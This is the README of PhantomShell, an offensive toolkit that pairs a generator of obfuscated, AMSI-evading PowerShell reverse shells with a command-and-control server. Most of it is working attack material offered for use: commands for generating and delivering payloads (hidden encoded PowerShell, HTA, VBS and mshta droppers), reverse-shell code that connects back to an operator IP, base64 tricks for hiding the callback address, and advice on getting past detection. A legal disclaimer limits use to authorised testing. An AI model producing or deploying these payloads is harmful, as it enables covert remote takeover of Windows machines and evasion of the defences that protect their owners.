```markdown
<div align="center">

```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
       ███████╗██╗  ██╗███████╗██╗     ██╗         ██████╗██████╗
       ██╔════╝██║  ██║██╔════╝██║     ██║        ██╔════╝╚════██╗
       ███████╗███████║█████╗  ██║     ██║        ██║      █████╔╝
       ╚════██║██╔══██║██╔══╝  ██║     ██║        ██║     ██╔═══╝
       ███████║██║  ██║███████╗███████╗███████╗   ╚██████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝    ╚═════╝╚══════╝
```

### Advanced PowerShell AV/AMSI Evasion Framework + Enterprise C2 Server

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Version](https://img.shields.io/badge/Version-2.0-red?style=for-the-badge)](https://github.com/adrilaw/PhantomShell)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-black?style=for-the-badge&logo=linux)](https://github.com/adrilaw/PhantomShell)
[![Target](https://img.shields.io/badge/Target-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/adrilaw/PhantomShell)
[![C2](https://img.shields.io/badge/C2-Web%20UI%20%7C%20CLI-green?style=for-the-badge)](https://github.com/adrilaw/PhantomShell)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

> **Complete Red Team Suite — Payload Generation + Command & Control**  
> *For authorized penetration testing and red team operations only.*

</div>

---

## 📋 Table of Contents
- [Overview](#-overview)
- [Quick Start](#-quick-start)
- [Architecture](#-architecture)
- [C2 Server Features](#-c2-server-features)
- [Payload Generator Features](#-payload-generator-features)
- [Command Reference](#-command-reference)
- [Complete Attack Workflow](#-complete-attack-workflow)
- [Technical Deep Dive](#-technical-deep-dive)
- [Performance Metrics](#-performance-metrics)
- [Security Considerations](#-security-considerations)
- [Troubleshooting](#-troubleshooting)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Legal Disclaimer](#-legal-disclaimer)
- [License](#-license)
- [Credits](#-credits)

---

## 👻 Overview

**PhantomShell** is a comprehensive red teaming framework combining two powerful components:

| Component | Description |
|-----------|-------------|
| **Payload Generator** | Creates obfuscated, AMSI-evading PowerShell reverse shells |
| **C2 Server** | Professional-grade Command & Control with Web UI + CLI |

### Why PhantomShell?

- **Evades signature-based AV/AMSI** through multi-layer obfuscation
- **Professional C2 infrastructure** with real-time session management
- **Polymorphic payloads** that change fingerprints every run
- **Multiple delivery formats** (PowerShell, CMD, HTA, VBS, MSHTA)
- **Built-in HTTP server** for payload hosting
- **Integrity verification** ensures every payload works

---

## 🚀 Quick Start

### 1. Start the C2 Server
```bash
python3 phantomc2.py c2 --port 4444 --web-port 8080 --password MySecretPass
```

### 2. Generate a Payload (in another terminal)
```bash
python3 phantomc2.py revshell -i YOUR_IP -p 4444
```

### 3. Deploy on Target
Copy the generated command and execute on the target Windows machine.

### 4. Access Web UI
Open `http://your-server:8080` in your browser and login with your password.

---

## 🏗️ Architecture

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│   Target Machine│────▶│   C2 Server      │◀────│   Operator      │
│   (Payload)     │     │   - Listener:4444│     │   - Web UI:8080 │
│                 │     │   - Web UI:8080  │     │   - CLI         │
└─────────────────┘     │   - Session Mgr  │     └─────────────────┘
        │               └──────────────────┘            │
        │                       ▲                       │
        └───────────────────────┼───────────────────────┘
                        Reverse Shell
                    (TCP session with keep-alive)
```

---

## 🎮 C2 Server Features

### Dual Interface

| Interface | Capabilities |
|-----------|--------------|
| **🌐 Web UI** | Cyberpunk-styled dashboard, real-time updates, session management, command execution |
| **💻 CLI** | Full control via terminal, interactive shells, batch commands |

### Session Management

| Feature | Description |
|---------|-------------|
| **Real-time Monitoring** | Live session status with color-coded indicators |
| **Multi-session Handling** | Manage 50+ concurrent sessions |
| **Session Persistence** | Automatic keep-alive checks every 10 seconds |
| **Command History** | Navigate previous commands with ↑/↓ arrows |
| **Quick Commands** | One-click execution of common operations |
| **Dead Session Cleanup** | Automatic pruning with `prune` command |

### Web UI Dashboard

```
┌─────────────────────────────────────────────────────────────┐
│ PHANTOMSHELL C2                                  12 SESSIONS 14:32│
├───────────────┬─────────────────────────────────────────────┤
│               │  ┌────────┬────────┬────────┬────────┐     │
│  SESSIONS     │  │ Total  │ Active │  Dead  │ Cmds   │     │
│  PANEL        │  │   15   │   12   │   3    │  342   │     │
│  ┌────────┐   │  └────────┴────────┴────────┴────────┘     │
│  │#1 admin │   │  ┌────────────────────────────────────┐    │
│  │#2 user  │   │  │ PS> whoami                         │    │
│  │#3 sys   │   │  │ corp\administrator                 │    │
│  │#4 sql   │   │  └────────────────────────────────────┘    │
│  └────────┘   │  ┌────────────────────────────────────┐    │
│               │  │ [whoami] [hostname] [ipconfig]     │    │
│               │  │ [netstat] [systeminfo] [processes] │    │
│               │  └────────────────────────────────────┘    │
├───────────────┴─────────────────────────────────────────────┤
│ [14:32:15] [+] Session #1 connected from 10.0.0.23          │
│ [14:32:10] [*] Executed command on #4: whoami               │
└─────────────────────────────────────────────────────────────┘
```

### CLI Control Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List all sessions | `sessions` |
| `interact <id>` | Interactive shell | `interact 1` |
| `exec <id> <cmd>` | Run single command | `exec 1 whoami` |
| `kill <id>` | Mark session dead | `kill 1` |
| `prune` | Remove dead sessions | `prune` |
| `exit` | Shutdown C2 | `exit` |

---

## 📦 Payload Generator Features

### Obfuscation Profiles

| Profile | Description | Example Transformation |
|---------|-------------|------------------------|
| `minimal` | Short variable renames | `$client` → `$c`, `$stream` → `$st` |
| `aggressive` | Hex-style variable names | `$client` → `$xA1`, `$stream` → `$xB2` |
| `random` | Fully random names per run | `$client` → `$mKpRx`, `$stream` → `$zQ6v8A6` |

### Encoding Layers

| Layer | Technique | Evasion Level | Decoding Steps |
|-------|-----------|---------------|----------------|
| `1` | utf-16le → base64 | Basic | Single decode |
| `2` | IEX(FromBase64String(...)) | Intermediate | Two-stage decode |
| `3` | Triple-wrap with temp variables | Advanced | Three-stage decode |

### Delivery Formats

| Format | Command | Use Case |
|--------|---------|----------|
| `powershell` | `powershell -enc <base64>` | Direct execution |
| `cmd` | `cmd /c "powershell -enc ..."` | Command injection |
| `hta` | HTML Application file | Phishing attachments |
| `vbs` | VBScript file | Macro delivery |
| `mshta` | `mshta vbscript:...` | One-liner execution |

---

## 📚 Command Reference

### C2 Server Commands

```bash
# Start C2 server
python3 phantomc2.py c2 [OPTIONS]

Options:
  --host HOST        Bind address (default: 0.0.0.0)
  --port PORT        Shell listener port (default: 4444)
  --web-port PORT    Web UI port (default: 8080)
  --password PASS    Web UI password (default: phantomshell)
  --no-cli          Disable interactive CLI
  --no-banner       Suppress startup banner

Examples:
  # Basic server
  python3 phantomc2.py c2 --port 4444 --password "RedTeam2024"
  
  # Custom ports
  python3 phantomc2.py c2 --port 5555 --web-port 8080 --password "P@ssw0rd!"
  
  # Headless mode (no CLI)
  python3 phantomc2.py c2 --no-cli
```

### Payload Generation Commands

#### `revshell` - Standalone Payload
```bash
python3 phantomc2.py revshell -i <IP> -p <PORT> [OPTIONS]

Options:
  -o, --obf-profile   minimal/aggressive/random (default: aggressive)
  -l, --layers        1/2/3 (default: 1)
  -f, --format        powershell/cmd/hta/vbs/mshta
  --enc-b64           Hide IP/port in base64
  --keep-pwd          Show CWD in prompt (may trigger AMSI)
  --do-not-hide       Omit -NoP -sta -NonI -W Hidden
  -v, --verbose       Show decoded payload before encoding

Examples:
  # Basic reverse shell
  python3 phantomc2.py revshell -i 10.10.10.5 -p 4444
  
  # Maximum evasion
  python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64
  
  # HTA dropper
  python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
  
  # Verbose mode to see inner workings
  python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -v
```

#### `server` - HTTP Payload Hosting
```bash
python3 phantomc2.py server -i <IP> -p <PORT> [OPTIONS]

Options:
  --server-port PORT  HTTP server port (default: 8000)
  -o, --outfile       Payload filename (random if omitted)
  --keep-file         Keep file after serving
  [all revshell options]

Examples:
  # Basic hosting
  python3 phantomc2.py server -i 10.10.10.5 -p 4444
  
  # Custom HTTP port with named file
  python3 phantomc2.py server -i 10.10.10.5 -p 4444 --server-port 9090 -o update.ps1
  
  # 3-layer encoding with file persistence
  python3 phantomc2.py server -i 10.10.10.5 -p 4444 -l 3 --enc-b64 --keep-file
```

#### `polymorph` - Variant Generator
```bash
python3 phantomc2.py polymorph -i <IP> -p <PORT> -n <COUNT> [OPTIONS]

Options:
  -n, --count         Number of variants (default: 3)
  -l, --layers        1/2/3
  --enc-b64           Hide IP/port

Examples:
  # 5 variants
  python3 phantomc2.py polymorph -i 10.10.10.5 -p 4444 -n 5
  
  # 10 variants with 2 layers each
  python3 phantomc2.py polymorph -i 10.10.10.5 -p 4444 -n 10 -l 2 --enc-b64
  
  # 3 variants with maximum evasion
  python3 phantomc2.py polymorph -i 10.10.10.5 -p 4444 -n 3 -l 3
```

Output example:
```
── Variant 1  profile=minimal     layers=1  FP:B0CCA4CD  ──────────
powershell -NoP -sta -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwA...

── Variant 2  profile=aggressive  layers=1  FP:06F530B1  ──────────
powershell -NoP -sta -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwB...

── Variant 3  profile=random      layers=1  FP:A273D56F  ──────────
powershell -NoP -sta -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwB...
```

---

## 🎯 Complete Attack Workflow

### Phase 1: Infrastructure Setup
```bash
# Terminal 1 - Start C2 server
python3 phantomc2.py c2 --port 4444 --web-port 8080 --password "RedTeam2024"

# Expected output:
# [*] Shell listener on 0.0.0.0:4444
# [*] Web UI on http://0.0.0.0:8080
# [*] Password: RedTeam2024
```

### Phase 2: Payload Generation
```bash
# Terminal 2 - Generate maximum-evasion payload
python3 phantomc2.py revshell -i 192.168.1.100 -p 4444 \
    --obf-profile random \
    --layers 3 \
    --enc-b64 \
    --format powershell

# Output will be a long base64 string in red
```

### Phase 3: Delivery & Execution
```bash
# Option A: Direct execution on target (copy the red output)
powershell -NoP -sta -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACA...

# Option B: Host and download cradle
python3 phantomc2.py server -i 192.168.1.100 -p 4444 -l 2
# Output provides download cradle for target:
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACA...
```

### Phase 4: C2 Operations
```bash
# In C2 terminal or Web UI
sessions                    # View all sessions
# Output:
#  ID   IP                 USER@HOST          STATUS   CONNECTED
#  ───  ────────────────── ────────────────── ──────── ────────────
#  1    10.0.0.23          corp\administrator@DC01 ALIVE   14:32:15
#  2    10.0.0.45          user@WS02          ALIVE   14:30:22

interact 1                  # Interact with session 1
# PS #1 > whoami
# corp\administrator

# PS #1 > ipconfig /all
# Windows IP Configuration...

# PS #1 > net localgroup administrators
# ...

back                        # Return to C2 menu
```

---

## 🔬 Technical Deep Dive

### Evasion Techniques

**1. Variable Obfuscation**
```powershell
# Original
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.5',4444)
$stream = $client.GetStream()

# After aggressive obfuscation
$xA1 = New-Object System.Net.Sockets.TCPClient('10.10.10.5',4444)
$xB2 = $xA1.GetStream()
```

**2. Multi-layer Encoding**
```
Layer 1: [base64 of utf-16le]
Example: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQAwAC4ANQAnACwANAA0ADQAKQA7AC4ALgAuAA==

Layer 2: IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAKAB...')))
Layer 3: $_b=[Convert]::FromBase64String('SQBFAFgAKAB...');$_s=[Text.Encoding]::Unicode.GetString($_b);IEX($_s)
```

**3. IP/Port Hiding**
```powershell
# Instead of: '10.10.10.5',4444
# Hidden inside base64:
([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTAuMTAuMTAuNQ=='))),
[int]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('NDQ0NA==')))
```

### Integrity Verification

Every payload undergoes rigorous checking:

```python
REQUIRED = ["GetStream", "Read(", "Write(", "Flush(", "Close()",
            "GetBytes(", "GetString(", ".Length", "Out-String", "IEX"]

def verify(payload):
    # Check all required tokens present
    # Detect double-brace leaks {{ }}
    # Ensure no non-ASCII characters
    # Round-trip decode verification
```

If any check fails, the tool aborts with an error message.

---

## 📊 Performance Metrics

| Component | Capacity | Latency | Resource Usage |
|-----------|----------|---------|----------------|
| Concurrent Sessions | 50+ | <100ms | ~2MB RAM per 10 sessions |
| Command Execution | Unlimited | 30s timeout | Minimal CPU |
| Web UI Updates | 3s interval | <500ms | Single thread |
| Payload Generation | <2s per payload | N/A | ~10MB RAM |
| HTTP Server | Unlimited | Standard | Single thread |

---

## 🔒 Security Considerations

### Built-in Protections

| Protection | Implementation |
|------------|----------------|
| **Authentication** | Password required for Web UI |
| **Session Tokens** | Bearer token API authentication |
| **XSS Prevention** | HTML escaping in web UI |
| **Command Sanitization** | Output encoding |
| **Access Logging** | All logins and commands logged |
| **Dead Session Cleanup** | Automatic removal |

### Operational Security Best Practices

1. **Change default password immediately**
   ```bash
   python3 phantomc2.py c2 --password "YourStrongPassword123!"
   ```

2. **Use firewall rules**
   ```bash
   # Allow only specific IPs
   ufw allow from 192.168.1.0/24 to any port 8080
   ufw allow from 192.168.1.0/24 to any port 4444
   ```

3. **Consider reverse proxy with HTTPS**
   ```nginx
   # nginx configuration example
   server {
       listen 443 ssl;
       server_name c2.yourdomain.com;
       
       ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;
       
       location / {
           proxy_pass http://127.0.0.1:8080;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
       }
   }
   ```

4. **Regular maintenance**
   ```bash
   # Prune dead sessions hourly
   echo "prune" | python3 phantomc2.py c2 --no-cli
   
   # Monitor logs
   tail -f /var/log/phantomshell.log
   ```

---

## 🐛 Troubleshooting

<details>
<summary><b>🔴 Cannot bind to port</b></summary>

```
Error: Cannot bind shell listener on port 4444
```

**Solution**: Port already in use
```bash
# Check what's using the port
sudo netstat -tulpn | grep 4444

# Kill the process or change port
sudo kill -9 <PID>
# OR
python3 phantomc2.py c2 --port 5555
```
</details>

<details>
<summary><b>🔴 Web UI not accessible</b></summary>

```
Connection refused when accessing http://server:8080
```

**Check**:
```bash
# Verify port is listening
netstat -tulpn | grep 8080

# Check firewall
sudo ufw status
sudo iptables -L -n

# Test local connection
curl http://localhost:8080

# Change port if needed
python3 phantomc2.py c2 --web-port 8081
```
</details>

<details>
<summary><b>🔴 Sessions not appearing</b></summary>

**Symptoms**: C2 shows "Waiting for connections..." but no sessions appear.

**Verify**:
```bash
# 1. Check if C2 is listening
netstat -tulpn | grep 4444

# 2. Test locally
python3 phantomc2.py revshell -i 127.0.0.1 -p 4444
# Copy output and run in PowerShell on same machine

# 3. Check firewall on C2 server
sudo ufw status

# 4. Verify target can reach your server
# On target:
Test-NetConnection YOUR_SERVER_IP -Port 4444
```
</details>

<details>
<summary><b>🔴 Payload verification fails</b></summary>

```
Error: Layer round-trip verification FAILED. Aborting.
```

**Solution**: This is rare but indicates encoding corruption
```bash
# Try with fewer layers
python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -l 1

# Avoid incompatible options
python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 --no-enc-b64

# Update to latest version
git pull origin main
```
</details>

<details>
<summary><b>🔴 AMSI still catching payload</b></summary>

**Symptom**: Payload executes but gets caught by AMSI.

**Solutions**:
```bash
# Maximum evasion profile
python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64

# Use polymorph to generate different variant
python3 phantomc2.py polymorph -i 10.10.10.5 -p 4444 -n 5 -l 3 --enc-b64

# Host via HTTP server (reduces disk exposure)
python3 phantomc2.py server -i 10.10.10.5 -p 4444 -l 3 --enc-b64
```
</details>

---

## 🗺️ Roadmap

### ✅ Completed
- [x] v1.0 - Basic payload generation
- [x] v2.0 - Multi-layer encoding + verification + C2 server

### 🚧 In Progress
- [ ] v2.1 - SSL/TLS support for C2 communications
- [ ] v2.2 - Database backend (SQLite/PostgreSQL) for session persistence
- [ ] v2.3 - Multi-user support with role-based access control

### 📅 Planned
- [ ] v2.4 - Encrypted C2 traffic with custom protocol
- [ ] v2.5 - Plugin architecture for custom modules
- [ ] v2.6 - SOCKS proxy support through compromised hosts
- [ ] v2.7 - File upload/download capabilities
- [ ] v2.8 - Meterpreter-like extensions
- [ ] v3.0 - Full GUI client

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

### Areas Needing Help
- **Additional obfuscation techniques** - New ways to evade detection
- **More delivery formats** - MSI, JScript, WSF, etc.
- **C2 feature enhancements** - File transfer, proxy support
- **Documentation** - Translations, tutorials, videos
- **Bug fixes** - Report issues, submit PRs
- **Testing** - Test on different Windows versions/AVs

### Contribution Workflow
```bash
# Fork the repository
# Clone your fork
git clone https://github.com/YOUR_USERNAME/PhantomShell.git

# Create a feature branch
git checkout -b feature/amazing-feature

# Make your changes
# Test thoroughly
# Commit with clear message
git commit -m "Add amazing new feature"

# Push to your fork
git push origin feature/amazing-feature

# Open a Pull Request
```

### Coding Standards
- Follow existing code style
- Add comments for complex logic
- Update documentation
- Include tests if applicable

---

## ⚠️ Legal Disclaimer

**PhantomShell is intended EXCLUSIVELY for:**

- ✅ Authorized penetration testing engagements
- ✅ Red team operations with written permission
- ✅ CTF competitions
- ✅ Security research in isolated lab environments

**🚫 Using this tool against systems you do not own or have explicit written authorization to test is ILLEGAL and UNETHICAL.**

### Legal Compliance Checklist
- [ ] Do you have written authorization from the system owner?
- [ ] Is your testing within the scope defined in the authorization?
- [ ] Have you notified relevant parties (IT security, management)?
- [ ] Are you complying with all applicable laws and regulations?

### Jurisdiction-Specific Notes
- **USA**: Computer Fraud and Abuse Act (CFAA) applies
- **EU**: General Data Protection Regulation (GDPR) considerations
- **UK**: Computer Misuse Act 1990
- **Australia**: Cybercrime Act 2001
- **Canada**: Criminal Code (R.S.C., 1985, c. C-46)

The author assumes **ZERO LIABILITY** for misuse. You are solely responsible for your actions and compliance with all applicable local, state, and federal laws.

**ALWAYS OBTAIN WRITTEN AUTHORIZATION BEFORE TESTING.**

---

## 📜 License

```
MIT License

Copyright (c) 2025 adrilaw

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
```

---

## 🙏 Credits

### Original Work
- **Nishang** by [samratashok](https://github.com/samratashok/nishang) - Original reverse shell framework that inspired this project
- **BypassAMSI_PSRevshell** by [gunzf0x](https://github.com/gunzf0x) - AMSI bypass techniques

### Creator
- **PhantomShell** by [adrilaw](https://github.com/adrilaw) - Complete rewrite, C2 server, multi-layer encoding, verification system

### Contributors
- [Your name here] - Be the first!

### Inspiration
- Various C2 frameworks (Cobalt Strike, Metasploit, Covenant)
- PowerShell obfuscation research community
- Red team tool developers

---

## 📞 Contact & Support

### GitHub
- **Repository**: [https://github.com/adrilaw/PhantomShell](https://github.com/adrilaw/PhantomShell)
- **Issues**: [Report bugs](https://github.com/adrilaw/PhantomShell/issues)
- **Discussions**: [Join conversations](https://github.com/adrilaw/PhantomShell/discussions)

### Social
- **Twitter**: [@adrilaw](https://twitter.com/adrilaw)
- **LinkedIn**: [adrilaw](https://linkedin.com/in/adrilaw)

### Community
- **Discord**: [Join our server](https://discord.gg/phantomshell) (coming soon)
- **Matrix**: [#phantomshell:matrix.org](https://matrix.to/#/#phantomshell:matrix.org)

### Professional Inquiries
For training, consulting, or professional engagements:
- **Email**: adrilaw@protonmail.com
- **Signal**: (available upon request)

---

<div align="center">

---

**Made with 🖤 by [Adrilaw/Kidpentester](https://github.com/Adrilaw)**

*If this tool helped you in an engagement, consider dropping a ⭐*

---

### ⚡ PhantomShell - Where Ghosts Communicate

**v2.0** | 2500+ lines of evasion | 50+ concurrent sessions | 5 output formats | 3 obfuscation profiles

---

</div>
```
